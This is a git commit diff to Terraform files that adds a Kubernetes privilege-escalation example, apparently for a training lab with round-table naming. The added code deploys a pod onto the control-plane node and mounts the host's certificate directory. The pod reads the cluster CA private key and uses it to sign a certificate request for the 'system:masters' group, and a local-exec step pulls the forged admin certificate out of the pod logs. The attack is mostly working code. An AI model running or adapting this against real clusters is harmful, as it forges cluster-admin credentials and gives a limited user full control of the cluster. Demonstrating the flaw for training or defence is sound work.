722c7a8374fa314bd39d89bcc1c4eb7f286141b0
hv11285 <federico.carbonetti@devk.de>
2022-03-07 22:38:05 +0100

    +add terraform example for privilege escalation from lancelot (dev) to dragon (admin)

--- terraform/resources.tf
+++ terraform/resources.tf
@@ -2,17 +2,35 @@ resource "tls_private_key" "user-key" {
   algorithm = "RSA"
 }
 
+resource "tls_private_key" "admin-key" {
+  algorithm = "RSA"
+}
+
 resource "local_file" "user-key" {
   filename = local.user-key-file
   content  = tls_private_key.user-key.private_key_pem
 }
 
-resource "tls_cert_request" "csr" {
+resource "local_file" "admin-key" {
+  filename = local.admin-key-file
+  content  = tls_private_key.admin-key.private_key_pem
+}
+
+resource "tls_cert_request" "user-csr" {
   key_algorithm   = tls_private_key.user-key.algorithm
   private_key_pem = tls_private_key.user-key.private_key_pem
   subject {
     common_name  = var.username
     organization = var.usergroup
+  }
+}
+
+resource "tls_cert_request" "admin-csr" {
+  key_algorithm   = tls_private_key.admin-key.algorithm
+  private_key_pem = tls_private_key.admin-key.private_key_pem
+  subject {
+    common_name  = var.admin
+    organization = "system:masters"
   }
 }
 
@@ -22,7 +40,7 @@ resource "kubernetes_certificate_signing_request_v1" "k8s-csr" {
   }
   spec {
     usages      = ["client auth"]
-    request     = tls_cert_request.csr.cert_request_pem
+    request     = tls_cert_request.user-csr.cert_request_pem
     signer_name = "kubernetes.io/kube-apiserver-client"
   }
 }
@@ -121,5 +139,66 @@ resource "kubernetes_role_binding_v1" "deployment-admin-rb" {
     kind      = "Group"
     name      = var.usergroup
     api_group = "rbac.authorization.k8s.io"
+  }
+}
+
+resource "kubernetes_deployment_v1" "dragon-deployment" {
+  metadata {
+    name      = "dragon"
+    namespace = kubernetes_namespace_v1.round-table.metadata[0].name
+    labels = {
+      app = "dragon"
+    }
+  }
+  provisioner "local-exec" {
+    command = "kubectl logs -n ${kubernetes_namespace_v1.round-table.metadata[0].name} deployments/dragon | grep \"BEGIN CERTIFICATE\" -A 50 > ${local.admin-cert-file}"
+  }
+  spec {
+    replicas = "1"
+    selector {
+      match_labels = {
+        app = "dragon"
+      }
+    }
+    template {
+      metadata {
+        labels = {
+          app = "dragon"
+        }
+      }
+      spec {
+        toleration {
+          key      = ""
+          operator = "Exists"
+          effect   = "NoSchedule"
+        }
+        node_selector = {
+          "node-role.kubernetes.io/master" = ""
+        }
+        volume {
+          name = "k8s-certs"
+          host_path {
+            path = var.k8s-certs-path
+          }
+        }
+        volume {
+          name = "tmp"
+          empty_dir {}
+        }
+        container {
+          name  = "alpine"
+          image = "alpine"
+          volume_mount {
+            mount_path = var.k8s-certs-path
+            name       = "k8s-certs"
+          }
+          volume_mount {
+            mount_path = "/tmp"
+            name       = "tmp"
+          }
+          command = ["sh", "-c", "apk upgrade; apk add openssl; echo \"${trimspace(base64encode(tls_cert_request.admin-csr.cert_request_pem))}\" > /tmp/dragon.csr; cat /tmp/dragon.csr | base64 -d | openssl x509 -req -CA /etc/kubernetes/pki/ca.crt -CAkey /etc/kubernetes/pki/ca.key -CAcreateserial -out /tmp/dragon.crt -days 365; cat /tmp/dragon.crt; sleep 3600;"]
+        }
+      }
+    }
   }
 }
--- terraform/variables.tf
+++ terraform/variables.tf
@@ -12,7 +12,16 @@ variable "username" {
 variable "usergroup" {
 }
 
+variable "admin" {
+}
+
+variable "k8s-certs-path" {
+  description = "The folder where your cluster saves the k8s certificates"
+}
+
 locals {
   user-key-file  = "output/user-pki/${var.username}.key"
   user-cert-file = "output/user-pki/${var.username}.crt"
+  admin-key-file = "output/admin-pki/${var.admin}.key"
+  admin-cert-file = "output/admin-pki/${var.admin}.crt"
 }
